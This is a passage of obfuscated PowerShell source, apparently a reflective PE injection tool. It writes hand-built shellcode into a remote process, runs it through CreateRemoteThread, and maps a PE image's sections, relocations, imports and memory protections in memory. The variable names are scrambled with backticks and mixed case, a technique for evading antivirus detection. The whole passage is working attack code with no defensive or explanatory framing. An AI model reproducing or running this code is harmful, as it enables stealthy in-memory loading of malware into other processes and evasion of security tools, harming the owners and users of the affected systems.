                Throw "Unable to write DLL path to remote process memory"
            }
            if (${F`UncTi`on`Name`SIZE} -ne ${nu`mbYTE`s`W`RiTtEN})
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        
        else
        {
            ${RFUN`cNA`mEP`Tr} = ${funcTi`O`Nn`AME`pTR}
        }

        
        ${KeR`NeL3`2`hA`NDlE} = ${Wi`N3`2fuNC`TioNs}.GetModuleHandle.Invoke("kernel32.dll")
        ${G`etprOCa`D`dr`ESS`ADDR} = ${wI`N32Fu`NC`TI`oNS}.GetProcAddress.Invoke(${K`er`NEL`32Ha`NDlE}, "GetProcAddress") 

        
        ${g`eTproCa`Dd`ResSRe`Tmem} = ${WI`N32fUNc`T`i`onS}.VirtualAllocEx.Invoke(${R`EmoT`ep`ROchanD`le}, [IntPtr]::Zero, [UInt64][UInt64]${P`TRsi`ZE}, ${wiN32CoN`S`Ta`Nts}.MEM_COMMIT -bor ${wIn`32`Co`NStantS}.MEM_RESERVE, ${wiN`32C`ONst`AnTS}.PAGE_READWRITE)
        if (${ge`T`pR`oCADDReSsRETmEM} -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        
        
        [Byte[]]${gEtPRo`cad`D`REs`sSc} = @()
        if (${P`EI`Nfo}.PE64Bit -eq ${tR`Ue})
        {
            ${geT`p`ROcaddRE`sS`S`c1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            ${get`PRoCAdDR`E`SSsc2} = @(0x48, 0xba)
            ${G`e`TPr`OCaddrEsSSC3} = @(0x48, 0xb8)
            ${GETPR`o`cAD`DReSSSC4} = @(0xff, 0xd0, 0x48, 0xb9)
            ${gEtPrOcA`ddrE`sS`sc5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            ${G`ET`pRoC`Ad`DrEsss`c1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            ${getP`R`OcaD`drESs`sC2} = @(0xb9)
            ${GeTpR`OcA`DDr`eSsS`c3} = @(0x51, 0x50, 0xb8)
            ${GE`TPr`O`CadD`RESsSC4} = @(0xff, 0xd0, 0xb9)
            ${GeT`p`R`O`caDdrESsSc5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        ${S`cLe`NgTH} = ${gE`TpR`OCAd`dREssSc1}.Length + ${gE`TproCa`D`D`ReSss`c2}.Length + ${G`E`Tp`ROc`ADdrEs`ssc3}.Length + ${GETProC`ADD`R`ESssc4}.Length + ${GeTprOC`AD`dr`es`sSC5}.Length + (${Ptrs`Ize} * 4)
        ${scP`sM`Em} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${S`cleNG`Th})
        ${scps`memoRI`giNAL} = ${SCP`Sm`EM}

        Write-BytesToMemory -Bytes ${geTpro`CaDD`R`es`ss`c1} -MemoryAddress ${sc`PS`mEM}
        ${s`c`psMeM} = Add-SignedIntAsUnsigned ${s`c`pSMEM} (${ge`T`p`ROcaDDREsS`sC1}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${re`MotE`DllhA`NDlE}, ${S`Cpsm`EM}, ${fal`se})
        ${Sc`PSmeM} = Add-SignedIntAsUnsigned ${S`CPs`mEM} (${P`Trs`IZE})
        Write-BytesToMemory -Bytes ${GET`pRo`CAd`dre`ssS`C2} -MemoryAddress ${sCp`S`MEm}
        ${scPS`MeM} = Add-SignedIntAsUnsigned ${sCp`smEM} (${Ge`TPROC`ADdrEsS`sC2}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${RFuNC`NAm`E`ptr}, ${SCP`smEm}, ${FAl`Se})
        ${S`cPS`mEM} = Add-SignedIntAsUnsigned ${S`CP`SMEM} (${pT`RSiZe})
        Write-BytesToMemory -Bytes ${g`eTP`ROCADDr`e`SsSc3} -MemoryAddress ${S`CpS`Mem}
        ${sC`P`SMeM} = Add-SignedIntAsUnsigned ${S`C`PSMEM} (${geTprOca`DD`R`EsS`S`C3}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${gEt`P`RocaD`dRE`SSaDDr}, ${scpSM`EM}, ${FA`l`Se})
        ${S`C`psmem} = Add-SignedIntAsUnsigned ${S`CpsM`EM} (${pTrS`ize})
        Write-BytesToMemory -Bytes ${gE`TpRoCaD`drES`SS`C4} -MemoryAddress ${s`CPsMEm}
        ${s`C`Psmem} = Add-SignedIntAsUnsigned ${sC`PSmEM} (${get`p`ROcad`DR`ESSSc4}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${GE`T`pr`OcAdD`Re`sSretmem}, ${sc`Psm`Em}, ${FA`lse})
        ${S`cp`SMEM} = Add-SignedIntAsUnsigned ${sCP`SM`Em} (${PT`R`sIZE})
        Write-BytesToMemory -Bytes ${gE`TP`RoCadd`RE`sSsC5} -MemoryAddress ${Sc`PSmEm}
        ${sc`p`smEm} = Add-SignedIntAsUnsigned ${sc`pSmEM} (${g`ETp`RO`cAddRes`Ss`C5}.Length)

        ${RsC`A`Ddr} = ${W`I`N32FunCtI`Ons}.VirtualAllocEx.Invoke(${Re`mO`TePRoc`haNd`le}, [IntPtr]::Zero, [UIntPtr][UInt64]${s`c`lEnG`TH}, ${w`i`N`32cOnSTAnTs}.MEM_COMMIT -bor ${WIN32cONSt`A`Nts}.MEM_RESERVE, ${wIn32`cOn`sT`ANTS}.PAGE_EXECUTE_READWRITE)
        if (${rsC`A`ddr} -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]${nuM`B`YTesW`RITTEn} = [UIntPtr]::Zero
        ${s`UCcE`Ss} = ${W`i`N32`FUNCtIoNS}.WriteProcessMemory.Invoke(${Re`m`OTEPROchA`N`D`lE}, ${RSC`Ad`DR}, ${S`cpSME`mORiGIN`AL}, [UIntPtr][UInt64]${Sc`le`NGtH}, [Ref]${n`U`MbyTE`swrI`TtEn})
        if ((${SU`cCess} -eq ${F`Al`se}) -or ([UInt64]${N`U`m`BY`TeSWr`iTten} -ne [UInt64]${scL`E`NGth}))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        ${RTh`R`E`AD`HaNDle} = Create-RemoteThread -ProcessHandle ${REmoteprO`ch`ANd`Le} -StartAddress ${r`S`cAddR} -Win32Functions ${W`iN32`FU`NCTIOns}
        ${r`eS`ULT} = ${Wi`N32F`U`NCTi`oNs}.WaitForSingleObject.Invoke(${rtHrEaD`haND`Le}, 20000)
        if (${r`e`SULt} -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        
        [IntPtr]${rE`TU`RN`VAL`mEm} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${ptR`si`ze})
        ${rESU`lT} = ${WIn32fu`NC`T`IO`Ns}.ReadProcessMemory.Invoke(${rEMO`TepRO`cH`ANd`le}, ${g`etpRoCA`dd`ReSsrE`TMem}, ${r`EtURN`VaLMEM}, [UIntPtr][UInt64]${pT`R`SiZE}, [Ref]${Num`By`TEsWR`itTeN})
        if ((${rEsU`LT} -eq ${fA`l`sE}) -or (${n`Umbyt`ESwr`ItT`EN} -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]${pRo`C`A`DdReSs} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ret`UR`N`V`AlMem}, [Type][IntPtr])

        
        ${win`32`Fun`Cti`ONS}.VirtualFreeEx.Invoke(${r`e`MOtEP`ROcHAn`DLE}, ${RsC`A`DdR}, [UIntPtr][UInt64]0, ${wI`N32C`Onst`ANTS}.MEM_RELEASE) | Out-Null
        ${w`I`N32FuNCt`i`oNS}.VirtualFreeEx.Invoke(${rEmO`Te`pR`Oc`HaNdLe}, ${GeT`P`RoCaDD`ReSSR`eTMEM}, [UIntPtr][UInt64]0, ${wIN`3`2coNS`TA`NTS}.MEM_RELEASE) | Out-Null

        if (-not ${lo`A`dbYORDiN`AL})
        {
            ${w`in3`2F`U`NCTIoNS}.VirtualFreeEx.Invoke(${REMoT`epR`O`cH`ANDLe}, ${rFuNC`NaM`EptR}, [UIntPtr][UInt64]0, ${Wi`N32cONsT`A`NTs}.MEM_RELEASE) | Out-Null
        }

        return ${Pr`OcaDd`REsS}
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${t`RUE})]
        [Byte[]]
        ${Pe`B`ytES},

        [Parameter(Position = 1, Mandatory = ${t`Rue})]
        [System.Object]
        ${PeI`N`FO},

        [Parameter(Position = 2, Mandatory = ${t`RuE})]
        [System.Object]
        ${wIN32F`Un`CtIoNS},

        [Parameter(Position = 3, Mandatory = ${Tr`UE})]
        [System.Object]
        ${w`IN`32t`ypEs}
        )

        for( ${I} = 0; ${i} -lt ${peIN`Fo}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${i}++)
        {
            [IntPtr]${secT`i`OnHeadeRp`TR} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${PeiN`FO}.SectionHeaderPtr) (${I} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${WIN32T`yP`ES}.IMAGE_SECTION_HEADER)))
            ${seCti`oNHE`A`d`er} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${seCT`iONhE`A`derpTr}, [Type]${wiN3`2T`Yp`es}.IMAGE_SECTION_HEADER)

            
            [IntPtr]${SeCT`IOnde`StAd`DR} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${p`eInfo}.PEHandle) ([Int64]${SEc`Ti`on`hEAdEr}.VirtualAddress))

            
            
            
            
            ${SizE`oF`R`Aw`DAtA} = ${s`ec`Ti`OnHe`AdER}.SizeOfRawData

            if (${sE`ctiONHEaD`ER}.PointerToRawData -eq 0)
            {
                ${sIZ`eoFrAw`DAtA} = 0
            }

            if (${sI`ZE`ofR`AwDATa} -gt ${SEcTi`O`NheaDer}.VirtualSize)
            {
                ${S`IZeo`FR`AWDaTA} = ${S`E`ctionHe`ADER}.VirtualSize
            }

            if (${Siz`E`OFR`AW`daTa} -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo ${p`EinfO} -StartAddress ${SeC`T`IoNdESTADDr} -Size ${sIzeof`Rawd`AtA} | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy(${pebY`T`es}, [Int32]${sect`iON`He`ADer}.PointerToRawData, ${S`ectI`ondes`Ta`DDR}, ${sIZe`OFRaw`d`ATA})
            }

            
            if (${Se`CtIonHeA`d`ER}.SizeOfRawData -lt ${sEct`IO`NhEAd`Er}.VirtualSize)
            {
                ${DI`FfER`EN`ce} = ${sECTi`o`NHe`AdER}.VirtualSize - ${sIzeof`R`AWD`ATa}
                [IntPtr]${STar`TA`DDr`E`ss} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${se`cTiONDeSta`dDR}) ([Int64]${s`I`ZEoFRawDa`Ta}))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo ${p`EIn`Fo} -StartAddress ${s`TaRTadd`ResS} -Size ${d`I`FFerENCE} | Out-Null
                ${w`i`N32FUN`C`TIONs}.memset.Invoke(${st`A`RTADDreSs}, 0, [IntPtr]${Dif`Fe`RENCe}) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue})]
        [System.Object]
        ${P`EI`NFo},

        [Parameter(Position = 1, Mandatory = ${T`RUE})]
        [Int64]
        ${oriG`inaLi`m`AgebASe},

        [Parameter(Position = 2, Mandatory = ${t`RUe})]
        [System.Object]
        ${WiN3`2CO`N`stanTs},

        [Parameter(Position = 3, Mandatory = ${tr`Ue})]
        [System.Object]
        ${wiN`32TYp`eS}
        )

        [Int64]${Bas`EDiFFEre`N`cE} = 0
        ${aD`d`d`iFFERENCe} = ${T`RUe} 
        [UInt32]${IMa`Geb`AsEr`EL`ocsi`zE} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${wIn32`T`ypEs}.IMAGE_BASE_RELOCATION)

        
        if ((${OR`I`giNAL`iMaGEBAsE} -eq [Int64]${p`Ei`NfO}.EffectivePEHandle) `
                -or (${Pei`NfO}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt (${O`Ri`GIna`l`iMaGE`Base}) (${P`eINFo}.EffectivePEHandle)) -eq ${t`RuE})
        {
            ${BAS`E`dIffER`encE} = Sub-SignedIntAsUnsigned (${ori`ginAl`i`MageBASE}) (${pei`N`Fo}.EffectivePEHandle)
            ${A`DD`di`FfEREn`cE} = ${f`AlSe}
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt (${Pe`I`NfO}.EffectivePEHandle) (${oRI`GiNAl`imaGeB`ASE})) -eq ${t`RuE})
        {
            ${b`A`Se`dIffErEnCE} = Sub-SignedIntAsUnsigned (${p`EInFo}.EffectivePEHandle) (${ori`g`iNa`L`IMaGEb`Ase})
        }

        
        [IntPtr]${b`A`s`ER`ELOCPTr} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${Pe`iNfO}.PEHandle) ([Int64]${p`EiN`FO}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while(${Tr`Ue})
        {
            
            ${bAsE`ReLOCAti`O`N`TABlE} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${baSe`ReLoC`PtR}, [Type]${W`in`32TYpeS}.IMAGE_BASE_RELOCATION)

            if (${Bas`e`R`eLo`caTIOntABlE}.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]${mEM`Ad`DRBASe} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${P`EiN`FO}.PEHandle) ([Int64]${basE`R`El`oCati`oN`T`AbLe}.VirtualAddress))
            ${N`UMReLOcA`T`iONs} = (${basErElO`cA`T`io`NtAble}.SizeOfBlock - ${ImaGebaseR`ELOC`si`ZE}) / 2

            
            for(${I} = 0; ${I} -lt ${nu`MrelOCati`OnS}; ${I}++)
            {
                
                ${rELOCATiOn`In`Fop`Tr} = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]${b`Ase`R`eLOCp`TR}) ([Int64]${i`MaG`eBasErelo`cS`iZE} + (2 * ${i})))
                [UInt16]${RelOcAtiOn`i`Nfo} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ReL`O`cATIOn`i`NfO`PtR}, [Type][UInt16])

                
                [UInt16]${Re`LOCo`FfseT} = ${R`ElOcAt`iON`iNFo} -band 0x0FFF
                [UInt16]${relO`c`TY`PE} = ${RE`lOC`AtiO`NINFO} -band 0xF000
                for (${J} = 0; ${j} -lt 12; ${j}++)
                {
                    ${reLoC`TY`Pe} = [Math]::Floor(${r`ElOc`Type} / 2)
                }

                
                
                
                if ((${rE`lo`ctYpe} -eq ${win`32Con`st`AntS}.IMAGE_REL_BASED_HIGHLOW) `
                        -or (${rE`LOCT`Y`pE} -eq ${WIN3`2COns`T`AnTS}.IMAGE_REL_BASED_DIR64))
                {
                    
                    [IntPtr]${fIN`Ala`ddr} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${m`emADDr`Ba`SE}) ([Int64]${REloc`O`FFS`eT}))
                    [IntPtr]${cur`Ra`d`dR} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${fiNAlA`d`Dr}, [Type][IntPtr])

                    if (${add`dif`F`eReN`Ce} -eq ${t`RUe})
                    {
                        [IntPtr]${cuR`R`Addr} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${cU`RRa`DdR}) (${baSeDIFF`e`RE`N`CE}))
                    }
                    else
                    {
                        [IntPtr]${C`URra`ddr} = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]${CUR`RA`D`dR}) (${BaSE`di`Ffe`RE`NCE}))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr(${c`UR`RaddR}, ${fi`NA`ladDr}, ${fA`l`SE}) | Out-Null
                }
                elseif (${RE`LOc`T`YpE} -ne ${W`i`N32cO`NS`TaNts}.IMAGE_REL_BASED_ABSOLUTE)
                {
                    
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            ${bAs`ERElOC`pTR} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${bASE`REL`ocptR}) ([Int64]${ba`S`E`R`El`OcAtioNta`BLe}.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${t`RUE})]
        [System.Object]
        ${p`e`infO},

        [Parameter(Position = 1, Mandatory = ${t`Rue})]
        [System.Object]
        ${wIN32`Fu`NCT`i`ons},

        [Parameter(Position = 2, Mandatory = ${t`RUE})]
        [System.Object]
        ${wiN3`2`T`YPES},

        [Parameter(Position = 3, Mandatory = ${T`RUE})]
        [System.Object]
        ${win3`2CONStAN`TS},

        [Parameter(Position = 4, Mandatory = ${f`ALSE})]
        [IntPtr]
        ${r`eMOT`E`P`RocHAn`DLe}
        )

        ${REm`o`TEl`OADiNg} = ${FA`lsE}
        if (${pEI`NFo}.PEHandle -ne ${p`eI`NFo}.EffectivePEHandle)
        {
            ${r`EMOte`Loa`DinG} = ${t`RuE}
        }

        if (${PE`I`NFO}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]${impoR`TdeSCR`iP`TOR`pTR} = Add-SignedIntAsUnsigned ([Int64]${pei`NfO}.PEHandle) ([Int64]${p`e`iNFO}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while (${t`RUe})
            {
                ${IMP`oRTD`eSCR`I`PToR} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${Im`p`oRTDESc`RiPtORp`TR}, [Type]${W`I`N32TYPes}.IMAGE_IMPORT_DESCRIPTOR)

                
                if (${iMP`oRTDescRi`Pt`or}.Characteristics -eq 0 `
                        -and ${impo`RtD`escRIp`TOR}.FirstThunk -eq 0 `
                        -and ${i`mPOR`T`descr`ip`TOr}.ForwarderChain -eq 0 `
                        -and ${ImpORtdeS`CR`ipt`Or}.Name -eq 0 `
                        -and ${imPOr`TDeSc`R`i`PT`Or}.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                ${Impo`RT`dll`haNDlE} = [IntPtr]::Zero
                ${I`M`poR`Td`llP`AthPTR} = (Add-SignedIntAsUnsigned ([Int64]${PE`INfO}.PEHandle) ([Int64]${ImpO`RTde`SCriP`ToR}.Name))
                ${Im`PORTd`lLP`Ath} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${im`P`ortD`lLp`AtHptR})

                if (${rE`moTE`L`O`ADInG} -eq ${Tr`UE})
                {
                    ${iMPoR`T`dL`lhAn`dlE} = Import-DllInRemoteProcess -RemoteProcHandle ${remo`TE`pROCH`AN`dLe} -ImportDllPathPtr ${ImPo`RT`dLLPAtHp`Tr}
                }
                else
                {
                    ${IMp`OrTD`lLhan`Dle} = ${wI`N32`FUnCti`oNs}.LoadLibrary.Invoke(${iMpORt`dll`pa`Th})
                }

                if ((${impo`RTd`llH`An`dLE} -eq ${nU`ll}) -or (${iM`POrTD`llHAN`dlE} -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                
                [IntPtr]${t`HU`NKREF} = Add-SignedIntAsUnsigned (${Pe`info}.PEHandle) (${Impor`TD`escriP`ToR}.FirstThunk)
                [IntPtr]${Or`iG`inalThun`krEf} = Add-SignedIntAsUnsigned (${PE`INfo}.PEHandle) (${I`MPOr`Td`ESCr`i`PtOR}.Characteristics) 
                [IntPtr]${orig`in`ALT`hu`NK`REFVAL} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${OR`iGI`NA`lt`Hunk`REF}, [Type][IntPtr])

                while (${oRiG`INalt`huN`krEfval} -ne [IntPtr]::Zero)
                {
                    ${loa`DBYO`RDi`NAl} = ${f`AL`sE}
                    [IntPtr]${p`ROCED`UrenA`m`ePtR} = [IntPtr]::Zero
                    
                    
                    
                    [IntPtr]${nEw`THU`N`kREf} = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${OR`IGin`ALTHUN`k`Re`F`Val} -lt 0)
                    {
                        [IntPtr]${PRoc`ED`URE`NamepTr} = [IntPtr]${Ori`GInaltHunKRE`F`VAl} -band 0xffff 
                        ${LoA`db`y`OrD`INAL} = ${T`RuE}
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${or`ig`i`Na`LtHuNKR`eFVAL} -lt 0)
                    {
                        [IntPtr]${PRoC`EdUrEnaM`E`Ptr} = [Int64]${oRI`GiNalThu`N`KREFVAl} -band 0xffff 
                        ${lO`A`DBYORDI`Nal} = ${tr`UE}
                    }
                    else
                    {
                        [IntPtr]${st`R`iNgaDDr} = Add-SignedIntAsUnsigned (${PEIn`Fo}.PEHandle) (${Or`IgIN`AlThU`Nk`R`efv`Al})
                        ${ST`RInG`AddR} = Add-SignedIntAsUnsigned ${S`Tr`INgA`DDr} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        ${pR`oC`e`DURenA`mE} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${sT`RIn`gA`ddr})
                        ${pR`ocE`DuREN`Ame`Ptr} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${P`RocedUrEn`AmE})
                    }

                    if (${R`Emot`Elo`ADi`NG} -eq ${Tr`UE})
                    {
                        [IntPtr]${N`eWtH`U`NkrEF} = Get-RemoteProcAddress -RemoteProcHandle ${REmOt`eP`Ro`CHAnDLe} -RemoteDllHandle ${IMpO`RT`D`LLhAndLE} -FunctionNamePtr ${P`ROCEd`UR`EnaMePtr} -LoadByOrdinal ${LOa`d`B`YorDiNAL}
                    }
                    else
                    {
                        [IntPtr]${newTHun`Kr`eF} = ${WI`N32fu`N`cT`ions}.GetProcAddressIntPtr.Invoke(${impOrT`dl`L`ha`Ndle}, ${pROCeDuREN`A`MEp`TR})
                    }

                    if (${Ne`WThUn`K`REf} -eq ${N`ULL} -or ${ne`w`ThUNKref} -eq [IntPtr]::Zero)
                    {
                        if (${l`OADByo`R`di`NaL})
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr(${NeWTh`UnKR`Ef}, ${t`H`UnKReF}, ${F`AlSe})

                    ${t`HUnKR`eF} = Add-SignedIntAsUnsigned ([Int64]${TH`UNKr`eF}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]${oR`IG`INAL`ThuNKR`Ef} = Add-SignedIntAsUnsigned ([Int64]${Or`iG`I`Na`LTHUNKREf}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]${Orig`INa`lThu`NKr`EfVaL} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${oriGIN`A`LtHun`K`Ref}, [Type][IntPtr])

                    
                    
                    if ((-not ${lO`AdByOr`DINAL}) -and (${PR`OCedu`REN`AmEpTR} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${p`R`OCE`dUreNamePTr})
                        ${Pro`CED`UrE`Nam`ePtR} = [IntPtr]::Zero
                    }
                }

                ${ImportD`eSC`RIPtOrP`Tr} = Add-SignedIntAsUnsigned (${iMp`OR`TD`escrI`PTORPtR}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${WI`N32TY`p`Es}.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${t`RuE})]
        [UInt32]
        ${SecT`IOnC`HARAcTeRi`stI`cs}
        )

        ${pro`T`ecT`ION`FLAG} = 0x0
        if ((${seCt`iOn`c`HA`Ra`ctE`RiStiCs} -band ${WIn`3`2coNSTa`N`Ts}.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if ((${SeCTIO`NCha`R`A`CTERiS`T`ICS} -band ${wiN32cOnSt`A`N`Ts}.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if ((${s`eC`TI`OnCH`Ar`ACterISTI`cs} -band ${WiN3`2`cON`STAnts}.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    ${P`RoT`EC`TIOn`FLag} = ${WiN32`cO`NS`TA`Nts}.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    ${pr`Ot`ECt`i`oNfLaG} = ${w`in32`c`ONStaNtS}.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if ((${seCt`IoNC`HARaCTe`RIs`TICs} -band ${wi`N3`2conSTAnTS}.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    ${PRoT`ECTi`o`NF`Lag} = ${Wi`N32CoNSt`ANTs}.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    ${PRo`TeC`T`ioNflAg} = ${WiN32C`ONS`T`An`Ts}.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if ((${sE`ct`io`NcH`ARacT`eRistIcs} -band ${win32`c`O`NSTan`TS}.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if ((${seCt`i`On`cHAraCter`isTIcS} -band ${Win3`2`c`onSTaN`Ts}.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    ${prote`c`TIO`NFlaG} = ${W`I`N32C`oNSTaNts}.PAGE_READWRITE
                }
                else
                {
                    ${p`ROTe`cTIOn`FLAG} = ${WI`N32CoNS`Tants}.PAGE_READONLY
                }
            }
            else
            {
                if ((${S`ec`T`IOncHAr`Act`erIst`ICs} -band ${wiN32`CO`NST`ANTS}.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    ${pR`OTeC`TiO`NfL`AG} = ${w`In32c`O`Ns`TAntS}.PAGE_WRITECOPY
                }
                else
                {
                    ${PRoTEct`ion`FL`AG} = ${wIn32CO`Nst`ANts}.PAGE_NOACCESS
                }
            }
        }

        if ((${SeCtI`oN`C`hARAcT`er`iSTics} -band ${WIN`32`C`O`NstANTs}.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            ${pr`Ot`EcTIOn`Flag} = ${PROT`eCTIOn`Fl`Ag} -bor ${WIn32c`onST`Ants}.PAGE_NOCACHE
        }

        return ${ProtE`C`TIo`NfLAg}
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${T`RuE})]
        [System.Object]
        ${PeI`NfO},

        [Parameter(Position = 1, Mandatory = ${tr`UE})]
        [System.Object]
        ${w`IN32fUN`CT`IONS},

        [Parameter(Position = 2, Mandatory = ${TR`Ue})]
        [System.Object]
        ${wIn3`2CO`NSTan`Ts},

        [Parameter(Position = 3, Mandatory = ${tr`Ue})]
        [System.Object]
        ${wI`N`32`TyPes}
        )

        for( ${I} = 0; ${i} -lt ${pE`INFO}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${i}++)
        {
            [IntPtr]${seC`T`I`oNHeADE`RPTR} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${P`ei`NFo}.SectionHeaderPtr) (${i} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${W`in`32TyPES}.IMAGE_SECTION_HEADER)))
            ${seCT`ionHEA`der} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${SEcTI`o`NHE`ADe`RPtR}, [Type]${W`in32typ`es}.IMAGE_SECTION_HEADER)
            [IntPtr]${SEC`TIo`NPtr} = Add-SignedIntAsUnsigned (${P`E`inFo}.PEHandle) (${SeCti`o`N`heA`DeR}.VirtualAddress)

            [UInt32]${pRO`T`EctFlAg} = Get-VirtualProtectValue ${SEctI`onh`eAD`er}.Characteristics
            [UInt32]${SECTIO`Ns`ize} = ${Sect`i`oNheAD`er}.VirtualSize

            [UInt32]${oLDP`RoteCt`FL`Ag} = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo ${pEi`N`FO} -StartAddress ${sEctiO`Np`TR} -Size ${sEC`TI`ONSI`Ze} | Out-Null
            ${su`C`CeSS} = ${win32FU`NcTi`o`NS}.VirtualProtect.Invoke(${seCtio`N`PtR}, ${se`cTiOn`Si`Ze}, ${prOtEc`T`F`lAG}, [Ref]${oLDp`RO`TECt`FLag})
            if (${sucC`ESS} -eq ${F`A`lsE})
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    
    
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${tr`Ue})]
        [System.Object]
        ${Pe`InfO},

        [Parameter(Position = 1, Mandatory = ${Tr`Ue})]
        [System.Object]
        ${w`I`N`32`FuNCTIOnS},

        [Parameter(Position = 2, Mandatory = ${t`RUE})]
        [System.Object]
        ${Wi`N`32constANTs},

        [Parameter(Position = 3, Mandatory = ${Tr`Ue})]
        [String]
        ${eXEa`R`Gu`men`Ts},

        [Parameter(Position = 4, Mandatory = ${TR`UE})]
        [IntPtr]
        ${E`XeDoneB`yTEp`TR}
        )

        
        ${rEt`UR`Nar`RaY} = @()

